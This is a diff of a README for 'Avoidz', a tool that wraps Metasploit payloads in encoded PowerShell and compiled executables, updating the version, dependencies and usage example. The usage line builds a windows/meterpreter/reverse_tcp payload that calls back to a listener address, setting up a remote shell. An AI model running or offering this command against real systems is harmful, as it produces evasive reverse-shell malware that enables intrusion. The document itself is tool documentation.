@@ -1,4 +1,4 @@
-## Avoidz v 1.0 
+## Avoidz v 1.3 
     Author: Mascerano Bachir [ dev-labs ]
 
 ## Legal Disclamer:
@@ -6,12 +6,12 @@
     remember this is only for educational purpose.
 
 ## Description:
-    This tool Generate encoded powershell with metasploit payloads,convert C & C# Templates to EXE's 
+    This tool Generate encoded powershell with metasploit payloads,convert C, C#, py, go Templates to EXE's 
  
 ## Screenshot:
-![pic1](http://i.imgur.com/v3Jwj5g.png)
+![pic1](http://i.imgur.com/sTeiZyE.png)
 
-![pic2](http://i.imgur.com/L6GCvpJ.png)
+![pic2](http://i.imgur.com/I0lIBDl.png)
 
 <br /><br />
 
@@ -20,6 +20,9 @@
 	2 - xterm
 	3 - MinGW32
 	4 - Monodevelop
+	5 - Wine
+	6 - Python.exe v 2.7
+	7 - Golang
 
 ## Download/Config/Usage:
     1º - Download the tool from github
@@ -34,7 +37,7 @@
 
     4°- Run avoidz tool == example
      ./avoidz.rb == help command
-	 ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
+	 ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f c1 == generate
 
 ## video tutorial: 
-Avoidz v 1.0 temp1 generate : https://www.youtube.com/watch?v=ZilOByKkrVk
+Avoidz v 1.0 old method : https://www.youtube.com/watch?v=ZilOByKkrVk
